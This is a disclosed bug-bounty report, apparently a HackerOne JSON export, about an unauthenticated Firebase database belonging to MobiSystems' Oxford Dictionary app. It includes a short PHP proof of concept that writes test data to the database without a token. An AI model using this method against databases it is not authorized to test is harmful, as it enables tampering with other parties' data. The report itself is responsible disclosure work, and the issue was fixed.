{"id":736283,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzYyODM=","url":"https://hackerone.com/reports/736283","title":"open Firebase Database: msdict-dev.firebaseio.com","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-11-12T15:49:57.190Z","submitted_at":"2019-11-12T15:49:57.190Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kickino","url":"/kickino","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/yd5RLgSQJ9coeZVAk5vymbLF/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":43285,"url":"https://hackerone.com/mobisystems_ltd","handle":"mobisystems_ltd","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/MDUvnA77aLDbhPASQuenJw7B/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/MDUvnA77aLDbhPASQuenJw7B/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"MobiSystems Ltd.","twitter_handle":"","website":"https://www.mobisystems.com","about":"Leading provider of mobile productivity and business applications across platforms"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-01-20T11:47:59.039Z","bug_reporter_agreed_on_going_public_at":"2019-11-13T09:26:19.140Z","team_member_agreed_on_going_public_at":"2020-01-20T11:47:58.893Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\npublicly available Firebase Database (msdict-dev.firebaseio.com)\n\n## Steps To Reproduce:\nVersion: `Oxford Dictionary of English Free_v11.1.511`\nin `res/values/strings.xml`\n```\n\u003cstring name=\"firebase_database_url\"\u003ehttps://msdict-dev.firebaseio.com\u003c/string\u003e\n```\n\nAccessing your Firebase Database via https://msdict-dev.firebaseio.com/.json returns\n`null` instead of the usual `{ \"error\" : \"Permission denied\" }`\n\n## Supporting Material/References:\n\nhttps://medium.com/@danangtriatmaja/firebase-database-takover-b7929bbb62e1 describes how a firebase database can be taken over with similar conditions.\n\n## Impact\n\n```The above application doesn’t need any acces_token to insert data to the firebase database it’s completely open and anybody can access it without any access credentials.```\n\nThere are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:\nhttps://firebase.google.com/docs/database/security/resolve-insecurities","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003epublicly available Firebase Database (msdict-dev.firebaseio.com)\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eVersion: \u003ccode\u003eOxford Dictionary of English Free_v11.1.511\u003c/code\u003e\u003cbr\u003e\nin \u003ccode\u003eres/values/strings.xml\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;string name=\u0026quot;firebase_database_url\u0026quot;\u0026gt;https://msdict-dev.firebaseio.com\u0026lt;/string\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAccessing your Firebase Database via \u003ca title=\"https://msdict-dev.firebaseio.com/.json\" href=\"/redirect?url=https%3A%2F%2Fmsdict-dev.firebaseio.com%2F.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://msdict-dev.firebaseio.com/.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e returns\u003cbr\u003e\n\u003ccode\u003enull\u003c/code\u003e instead of the usual \u003ccode\u003e{ \u0026quot;error\u0026quot; : \u0026quot;Permission denied\u0026quot; }\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://medium.com/@danangtriatmaja/firebase-database-takover-b7929bbb62e1\" href=\"/redirect?url=https%3A%2F%2Fmedium.com%2F%40danangtriatmaja%2Ffirebase-database-takover-b7929bbb62e1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://medium.com/@danangtriatmaja/firebase-database-takover-b7929bbb62e1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e describes how a firebase database can be taken over with similar conditions.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003eThe above application doesn’t need any acces_token to insert data to the firebase database it’s completely open and anybody can access it without any access credentials.\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThere are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:\u003cbr\u003e\n\u003ca title=\"https://firebase.google.com/docs/database/security/resolve-insecurities\" href=\"/redirect?url=https%3A%2F%2Ffirebase.google.com%2Fdocs%2Fdatabase%2Fsecurity%2Fresolve-insecurities\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://firebase.google.com/docs/database/security/resolve-insecurities\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":63,"voters":["najeh_halawani","mashoud1122","kickino","mik317","sameerphad72","dhakal_ananda","mygf","ar-arvind","sudi","rudra_2000","and 53 more..."],"severity":{"rating":"medium","score":6.1,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":36830,"asset_type":"GOOGLE_PLAY_APP_ID","asset_identifier":"com.mobisystems.msdict.embedded.wireless.oxford.dictionaryofenglish","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6289608,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @kickino, \n\nThank you for the report! Unfortunately, we need a little more information from you before we can fully validate this report. \nPlease provide a detailed proof of concept that includes the following:\n* How to find the vulnerable functionality\n* Steps to reproduce the issue\n* How to actually exploit the issue\n\nProviding this information when submitting new reports will help us to quickly determine the validity of your report. Thank you for your help!\n\nIf you're unable to exploit the issue, feel free to self-close this report.\n\nRegards, \n@antenna ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/kickino\"\u003e@kickino\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eThank you for the report! Unfortunately, we need a little more information from you before we can fully validate this report. \u003cbr\u003e\nPlease provide a detailed proof of concept that includes the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eHow to find the vulnerable functionality\u003c/li\u003e\n\u003cli\u003eSteps to reproduce the issue\u003c/li\u003e\n\u003cli\u003eHow to actually exploit the issue\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eProviding this information when submitting new reports will help us to quickly determine the validity of your report. Thank you for your help!\u003c/p\u003e\n\n\u003cp\u003eIf you\u0026#39;re unable to exploit the issue, feel free to self-close this report.\u003c/p\u003e\n\n\u003cp\u003eRegards, \u003cbr\u003e\n\u003ca href=\"/antenna\"\u003e@antenna\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-12T15:57:31.650Z","updated_at":"2019-11-12T15:57:31.650Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mobisystems_ltd","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6293594,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"With the following code I was able to write to the database:\n```\u003c?php\nrequire __DIR__.'/vendor/autoload.php';\n\nconst DEFAULT_URL = 'https://msdict-dev.firebaseio.com';\nconst DEFAULT_TOKEN = '';\nconst DEFAULT_PATH = '/firebase/report_736283';\n\n$firebase = new \\Firebase\\FirebaseLib(DEFAULT_URL, DEFAULT_TOKEN);\n\n// --- storing an array ---\n$test = [\n    'foo' =\u003e 'bar',\n    'i_love' =\u003e 'lamp',\n    'id' =\u003e 42\n];\n$dateTime = new DateTime();\n$firebase-\u003eset(DEFAULT_PATH . '/' . $dateTime-\u003eformat('c'), $test);\n\n// --- storing a string ---\n$firebase-\u003eset(DEFAULT_PATH . '/name/contact001', 'John Doh');\n```\n\nIf you look now at https://msdict-dev.firebaseio.com/.json\nyou will see the line\n`{\"firebase\":{\"report_736283\":{\"2019-11-13T03:52:27+01:00\":{\"foo\":\"bar\",\"i_love\":\"lamp\",\"id\":42},\"name\":{\"contact001\":\"John Doh\"}}}}`\n\nwhich confirms that I have write permission to the Firebase database (without authentication).","markdown_message":"\u003cp\u003eWith the following code I was able to write to the database:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003erequire __DIR__.\u0026#39;/vendor/autoload.php\u0026#39;;\n\nconst DEFAULT_URL = \u0026#39;https://msdict-dev.firebaseio.com\u0026#39;;\nconst DEFAULT_TOKEN = \u0026#39;\u0026#39;;\nconst DEFAULT_PATH = \u0026#39;/firebase/report_736283\u0026#39;;\n\n$firebase = new \\Firebase\\FirebaseLib(DEFAULT_URL, DEFAULT_TOKEN);\n\n// --- storing an array ---\n$test = [\n    \u0026#39;foo\u0026#39; =\u0026gt; \u0026#39;bar\u0026#39;,\n    \u0026#39;i_love\u0026#39; =\u0026gt; \u0026#39;lamp\u0026#39;,\n    \u0026#39;id\u0026#39; =\u0026gt; 42\n];\n$dateTime = new DateTime();\n$firebase-\u0026gt;set(DEFAULT_PATH . \u0026#39;/\u0026#39; . $dateTime-\u0026gt;format(\u0026#39;c\u0026#39;), $test);\n\n// --- storing a string ---\n$firebase-\u0026gt;set(DEFAULT_PATH . \u0026#39;/name/contact001\u0026#39;, \u0026#39;John Doh\u0026#39;);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf you look now at \u003ca title=\"https://msdict-dev.firebaseio.com/.json\" href=\"/redirect?url=https%3A%2F%2Fmsdict-dev.firebaseio.com%2F.json\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://msdict-dev.firebaseio.com/.json\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nyou will see the line\u003cbr\u003e\n\u003ccode\u003e{\u0026quot;firebase\u0026quot;:{\u0026quot;report_736283\u0026quot;:{\u0026quot;2019-11-13T03:52:27+01:00\u0026quot;:{\u0026quot;foo\u0026quot;:\u0026quot;bar\u0026quot;,\u0026quot;i_love\u0026quot;:\u0026quot;lamp\u0026quot;,\u0026quot;id\u0026quot;:42},\u0026quot;name\u0026quot;:{\u0026quot;contact001\u0026quot;:\u0026quot;John Doh\u0026quot;}}}}\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003ewhich confirms that I have write permission to the Firebase database (without authentication).\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-13T02:54:59.570Z","updated_at":"2019-11-13T02:54:59.570Z","actor":{"username":"kickino","cleared":true,"url":"/kickino","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yd5RLgSQJ9coeZVAk5vymbLF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mobisystems_ltd","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6295517,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello, @kickino and thank you for your report. We now restricted the access to the Firebase real-time database.\n\nBest wishes,\nMiroslav","markdown_message":"\u003cp\u003eHello, \u003ca href=\"/kickino\"\u003e@kickino\u003c/a\u003e and thank you for your report. We now restricted the access to the Firebase real-time database.\u003c/p\u003e\n\n\u003cp\u003eBest wishes,\u003cbr\u003e\nMiroslav\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-13T08:53:36.024Z","updated_at":"2019-11-13T08:53:36.024Z","actor":{"username":"miroslav_paunov","cleared":false,"url":"/miroslav_paunov","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"kickino","url":"/kickino"},"genius_execution_id":null,"team_handle":"mobisystems_ltd","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6295728,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That's fast. :D \nThank you. Confirming it's restricted now. ","markdown_message":"\u003cp\u003eThat\u0026#39;s fast. :D \u003cbr\u003e\nThank you. Confirming it\u0026#39;s restricted now. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-13T09:26:11.329Z","updated_at":"2019-11-13T09:26:11.329Z","actor":{"username":"kickino","cleared":true,"url":"/kickino","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yd5RLgSQJ9coeZVAk5vymbLF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mobisystems_ltd","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6295729,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-13T09:26:19.159Z","updated_at":"2019-11-13T09:26:19.159Z","first_to_agree":true,"actor":{"username":"kickino","cleared":true,"url":"/kickino","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yd5RLgSQJ9coeZVAk5vymbLF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mobisystems_ltd","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6816405,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-20T11:47:58.932Z","updated_at":"2020-01-20T11:47:58.932Z","actor":{"username":"krassimir_dachev","cleared":false,"url":"/krassimir_dachev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3cii2wuQFWizEXVBEoST4UYq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mobisystems_ltd","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6816406,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-20T11:47:59.065Z","updated_at":"2020-01-20T11:47:59.065Z","actor":{"username":"krassimir_dachev","cleared":false,"url":"/krassimir_dachev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3cii2wuQFWizEXVBEoST4UYq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mobisystems_ltd","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}